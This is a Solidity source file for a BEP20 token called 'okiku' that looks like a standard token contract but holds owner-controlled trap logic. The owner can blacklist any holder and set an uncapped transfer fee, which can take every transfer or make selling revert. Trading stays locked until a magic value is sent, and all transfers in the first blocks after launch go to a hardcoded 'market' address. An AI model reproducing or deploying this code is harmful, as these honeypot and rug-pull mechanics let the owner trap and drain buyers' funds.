// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity >=0.8.0;

import "./IBEP20.sol";
import "./SafeMath.sol";


contract Ownable {
    address public _owner;

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function changeOwner(address newOwner) public onlyOwner {
        _owner = newOwner;
    }
}




contract OkikuToken is IBEP20, Ownable {
    
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;
    address public market=0xa47D8698126A353474dbAEF5C39f1dD04b6306c3;
    string constant  _name = "okiku";
    string constant _symbol = "okiku";
    uint8 immutable _decimals = 18;
    mapping(address => bool)public blackList;
    mapping(address => bool)public whiteList;
    uint256 fee = 30;
    uint256 kill = 5;
    uint256 public startTradeBlock = 0;
    uint256 private _totalSupply = 420690000000000*10**18;
    constructor()
    {
        _owner = msg.sender;
        _balances[_owner] = _totalSupply;
        whiteList[_owner] = true;
        whiteList[market] = true;
        emit Transfer(address(0), _owner, _totalSupply);     
    }

 
    function name() public  pure returns (string memory) {
        return _name;
    }

    function symbol() public  pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 value) public override returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }
    function setBlack(address sender, bool value) public onlyOwner returns (bool) {
         blackList[sender] = value;
        return true;
    }
    function setwhiteList(address sender, bool value) public onlyOwner returns (bool) {
        whiteList[sender] = value;
        return true;
    }
     function setstartTrade(uint256 value) public onlyOwner returns (bool) {
        if(value == 8888){
            startTradeBlock = block.number;     
        }else{
           startTradeBlock = 0; 
        }
        return true;
    }
    function setFee(uint256 _Fee) public onlyOwner returns (bool) {
        fee = _Fee;
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
        return true;
    }
    
    function burn(uint256 amount) public override returns (bool) {
        _burn(msg.sender, amount);
        return true;
    }
    
    function burnFrom(address account, uint256 amount) public override returns (bool) {
        _burn(account, amount);
        _approve(account, msg.sender, _allowances[account][msg.sender].sub(amount));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");    
        require(!blackList[sender] && !blackList[recipient]);     
            if (!whiteList[sender] && !whiteList[recipient]) {
                if (0 == startTradeBlock) {
                       require(0<startTradeBlock);
                } else {
                    if ( block.number < startTradeBlock + kill) {
                        _transfer(sender, market, amount);
                        return;
                    }
                }
                if(fee > 0){
                    uint256 fees = amount*fee/100;
                     _transfer(sender, market, fees);
                     amount = amount - fees;
                }
            }     
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
    
    function _burn(address account, uint256 value) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }

    function _approve(address owner, address spender, uint256 value) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }


}